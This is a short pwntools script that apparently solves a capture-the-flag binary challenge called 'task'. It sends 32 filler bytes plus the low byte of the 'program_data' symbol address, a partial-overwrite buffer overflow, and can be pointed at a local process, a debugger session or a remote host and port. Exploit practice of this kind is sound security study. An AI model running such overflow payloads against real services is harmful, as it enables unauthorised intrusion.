from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

p.sendline(b"A" * 32 +p8(elf.symbols['program_data'] & 0xFF))
print(p.clean(0.5))

